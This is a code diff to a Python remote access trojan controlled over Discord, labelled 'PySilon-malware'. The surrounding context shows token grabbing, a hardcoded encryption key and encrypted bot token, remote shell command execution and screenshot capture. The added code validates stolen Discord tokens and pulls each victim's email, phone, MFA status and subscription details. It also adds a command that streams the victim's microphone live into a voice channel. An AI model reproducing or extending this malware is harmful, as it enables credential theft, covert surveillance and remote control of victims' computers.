@@ -39,6 +39,10 @@ import asyncio
 import win32gui
 import logging
 import numpy as np
+from _random_string import get_random_string
+import ffmpeg
+
+
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
@@ -489,7 +493,46 @@ def grabToken():
             except:
                 continue
 
+def check_discord_token(token: str):
+    """Checks if a given Discord token is valid and returns user details if valid."""
+    
+    headers = {"Authorization": token}
+    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
 
+    if response.status_code != 200:
+        return {"valid": False, "message": "Invalid or expired token."}
+
+    user_data = response.json()
+
+    badges = []
+    flags = user_data.get('flags', 0)
+    if flags & 64: badges.append("HypeSquad Bravery")
+    if flags & 128: badges.append("HypeSquad Brilliance")
+    if flags & 256: badges.append("HypeSquad Balance")
+
+
+    nitro_res = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
+    has_nitro = bool(nitro_res.status_code == 200 and len(nitro_res.json()) > 0)
+
+
+    boost_res = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
+    boost_info = boost_res.json() if boost_res.status_code == 200 else []
+    available_boosts = sum(1 for boost in boost_info if boost.get("cooldown_ends_at") is None)
+
+    return {
+        "valid": True,
+        "username": f"{user_data['username']}#{user_data['discriminator']}",
+        "user_id": user_data['id'],
+        "email": user_data.get("email", "N/A"),
+        "phone": user_data.get("phone", "N/A"),
+        "mfa_enabled": user_data["mfa_enabled"],
+        "locale": user_data["locale"],
+        "verified": user_data["verified"],
+        "badges": badges,
+        "has_nitro": has_nitro,
+        "available_boosts": available_boosts,
+        "avatar_url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get('avatar') else None
+    }
 
 
 @bot.event
@@ -525,6 +568,7 @@ async def execute(ctx, name, *, command: str):
                     response = f"Changed directory to: {os.getcwd()}\n"
                 except Exception as e:
                     response = str(e) + "\n"
+                return    
             else:
                 process = subprocess.Popen(
                 command,
@@ -611,6 +655,7 @@ async def screenshot(ctx, inputid):
             all_screens=True,
             xdisplay=None
         )
+        random_string = get_random_string(6)
         fname = f'screenshot_{name}.png'
         image.save(fname)
         await ctx.send(file=discord.File(fname))
@@ -1029,87 +1074,68 @@ discord.opus.load_opus(opuslib_path)
 
 
 class PyAudioPCM(discord.AudioSource):
-    def __init__(self, rate=None, chunk=960) -> None:
-        p = pyaudio.PyAudio()
+    def __init__(self, input_device=1, channels=2, rate=48000, chunk=960) -> None:
+        self.p = pyaudio.PyAudio()
         self.chunks = chunk
-
-
-        default_device_index = p.get_default_input_device_info()['index']
-        device_info = p.get_device_info_by_index(default_device_index)
-
-
-        self.channels = device_info['maxInputChannels']
-        self.sample_rate = int(device_info['defaultSampleRate'])
-
-
-        if self.channels < 1:
-            self.channels = 1
-
-
-        debug_msg = f"Using device {default_device_index} - Channels: {self.channels}, Sample Rate: {self.sample_rate}"
-        logging.debug(debug_msg)
-        print(debug_msg)
-
-
-        try:
-            self.input_stream = p.open(
-                format=pyaudio.paInt16,
-                channels=self.channels,
-                rate=self.sample_rate,
-                input=True,
-                input_device_index=default_device_index,
-                frames_per_buffer=self.chunks
-            )
-        except Exception as e:
-            error_msg = f"Failed to open input stream: {e}"
-            logging.error(error_msg)
-            print(error_msg)
-            raise
-
-        self.p = p
-
+        self.input_stream = self.p.open(
+            format=pyaudio.paInt16,
+            channels=channels,
+            rate=rate,
+            input=True,
+            input_device_index=input_device,
+            frames_per_buffer=chunk
+        )
+    
     def read(self) -> bytes:
-        try:
-            audio_data = self.input_stream.read(self.chunks)
+        return self.input_stream.read(self.chunks)
+    
+    def cleanup(self):
+        self.input_stream.stop_stream()
+        self.input_stream.close()
+        self.p.terminate()
 
 
-            data_len_msg = f"Raw Audio Data Length: {len(audio_data)}"
-            logging.debug(data_len_msg)
-            print(data_len_msg)
+@bot.command()
+async def list_devices(ctx):
+    p = pyaudio.PyAudio()
+    device_list = []
+    for i in range(p.get_device_count()):
+        device_info = p.get_device_info_by_index(i)
+        device_list.append(f"{i}: {device_info['name']}")
+    p.terminate()
+    await ctx.send("Available input devices:\n" + "\n".join(device_list))
 
 
-            audio_np = np.frombuffer(audio_data, dtype=np.int16)
-            debug_audio_data = f"Audio Data (first 10 samples): {audio_np[:10]}"
-            logging.debug(debug_audio_data)
-            print(debug_audio_data)
-
-
-            return audio_data
-        except Exception as e:
-            error_msg = f"Error reading audio: {e}"
-            logging.error(error_msg)
-            print(error_msg)
-            raise
-
-
-@bot.command(name="mic")
-async def recordmic(ctx, user):
+@bot.command()
+async def mic(ctx, user, device_index: int):
     if user == name:
         try:
-            channel = bot.get_channel(1335115941444587615)
-            if channel:
-                vc = await channel.connect(self_deaf=True)
-                await ctx.send(f"Connected to channel {channel.name}.")
-            else:
-                await ctx.send("Channel not found.")
-
-            vc.play(PyAudioPCM())
-            await ctx.send(f'`[{current_time()}] Joined voice-channel and streaming microphone in realtime`')
-
+            if ctx.author.voice is None or ctx.author.voice.channel is None:
+                await ctx.send("You must be in a voice channel to use this command.")
+                return
+        
+            channel = ctx.author.voice.channel
+            vc = await channel.connect(self_deaf=True)
+            vc.play(PyAudioPCM(input_device=device_index))
+            await ctx.send(f"Joined voice channel and streaming microphone from device {device_index}.")
         except Exception as e:
-            await ctx.send(f"Error occurred: {str(e)}")
-            logging.error(f"Error occurred: {str(e)}")
-            print(f"Error: {str(e)}")
+            await ctx.send(f"An error occurred: {e}")
+
+
+@bot.command(name="devices")
+async def list_devices(ctx, user: str):
+    """Lists all enabled input devices."""
+    if user == name:
+        p = pyaudio.PyAudio()
+        devices = [f"**[{i}] {p.get_device_info_by_index(i)['name']}**"
+                   for i in range(p.get_device_count())
+                   if p.get_device_info_by_index(i)["maxInputChannels"] > 0]
+
+        message = "**Available Input Devices:**\n" + "\n".join(devices)
+        await ctx.send(message[:2000])
+
+
+
 
 
 def get_value_by_label(label, output):
@@ -1334,10 +1360,38 @@ async def key_command(ctx, *, keystrokes: str = None):
         )
         embed.set_author(
             name="PySilon-malware",
-            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
+            icon_url="https://raw.githubusercontent.com/adolfhustler/Aladeen/Flag_of_Wadiya.gif"
         )
         reaction_msg = await ctx.send(embed=embed)
         await reaction_msg.add_reaction('🔴')            
+
+
+@bot.command(name="checktoken")
+async def checktoken(ctx, token: str):
+    result = check_discord_token(token)
+
+    if not result["valid"]:
+        await ctx.send("❌ Invalid or expired token.")
+        return
+
+    embed = discord.Embed(
+        title=f"Token Info: {result['username']}",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="User ID", value=result["user_id"], inline=False)
+    embed.add_field(name="Email", value=result["email"], inline=False)
+    embed.add_field(name="Phone", value=result["phone"], inline=False)
+    embed.add_field(name="MFA Enabled", value=str(result["mfa_enabled"]), inline=False)
+    embed.add_field(name="Locale", value=result["locale"], inline=False)
+    embed.add_field(name="Verified", value=str(result["verified"]), inline=False)
+    embed.add_field(name="Badges", value=", ".join(result["badges"]) if result["badges"] else "None", inline=False)
+    embed.add_field(name="Nitro", value="Yes" if result["has_nitro"] else "No", inline=False)
+    embed.add_field(name="Available Boosts", value=str(result["available_boosts"]), inline=False)
+    
+    if result["avatar_url"]:
+        embed.set_thumbnail(url=result["avatar_url"])
+
+    await ctx.send(embed=embed)
 
 
 
